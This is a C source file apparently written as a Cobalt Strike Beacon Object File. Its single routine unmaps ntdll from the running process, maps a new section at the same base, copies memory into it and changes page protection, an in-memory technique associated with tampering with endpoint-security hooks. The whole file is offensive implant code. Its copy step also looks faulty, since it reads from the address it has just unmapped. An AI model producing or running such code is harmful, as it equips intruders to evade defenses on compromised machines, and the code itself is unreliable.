#include <windows.h>
#include <psapi.h>
#include <winternl.h>
#include "beacon.h"

DECLSPEC_IMPORT HANDLE NTAPI KERNEL32$GetCurrentProcess();
DECLSPEC_IMPORT BOOL NTAPI PSAPI$GetModuleInformation(
    HANDLE hProcess,
    HMODULE hModule,
    LPMODULEINFO lpmodinfo,
    DWORD cb
);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtCreateSection(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL
);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtUnmapViewOfSection(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$ZwMapViewOfSection(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID * BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);
DECLSPEC_IMPORT BOOL NTAPI KERNEL32$CloseHandle(HANDLE hObject);

DECLSPEC_IMPORT PVOID WINAPI MSVCRT$memcpy(
    _Out_writes_bytes_all_opt_(_MaxCount) PVOID _Dst,
    _In_reads_bytes_opt_(_MaxCount) PVOID _Src,
    _In_ size_t _MaxCount
);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flNewProtect,
    PDWORD lpflOldProtect
);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();



void go(char *args, int alen)
{
    // Declare necessary variables and structures
    HMODULE hNtdll = NULL;
    MODULEINFO modInfo;
    SIZE_T viewSize;
    HANDLE hSection = NULL;
    NTSTATUS status;
    HANDLE hProcess = KERNEL32$GetCurrentProcess();

    // Get the handle to ntdll
    hNtdll = GetModuleHandle("ntdll");

    // Get ntdll module information to find its size
    PSAPI$GetModuleInformation(hProcess, hNtdll, &modInfo, sizeof(MODULEINFO));
    PVOID ntdllBaseAddr = modInfo.lpBaseOfDll;
    viewSize = modInfo.SizeOfImage;

    // Create an empty section with the size of ntdll
    status = NTDLL$NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &viewSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(status))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create section: 0x%08X", status);
        return;
    }

    // Unmap the current ntdll mapped in the process
    status = NTDLL$NtUnmapViewOfSection(hProcess, ntdllBaseAddr);
    if (!NT_SUCCESS(status))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to unmap ntdll: 0x%08X", status);
        return;
    }

    // Map the new empty section to the process
    status = NTDLL$ZwMapViewOfSection(hSection, hProcess, &ntdllBaseAddr, 0, viewSize, 0, &viewSize, 1, MEM_COMMIT, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to map empty section to process: 0x%08X", status);
        return;
    }

    // Copy the contents of the original ntdll to the newly created section
    MSVCRT$memcpy(ntdllBaseAddr, hNtdll, viewSize);

    // Change the memory protection to PAGE_EXECUTE_READ
    DWORD oldProtect;
    BOOL bSuccess = KERNEL32$VirtualProtect(ntdllBaseAddr, viewSize, PAGE_EXECUTE_READ, &oldProtect);
    if (!bSuccess)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to change memory protection: %d", KERNEL32$GetLastError());
        return;
    }

    // Close the section handle
    KERNEL32$CloseHandle(hSection);

    // Inform the user that ntdll has been unmapped and remapped
    BeaconPrintf(CALLBACK_OUTPUT, "Successfully unmapped and remapped ntdll");
}
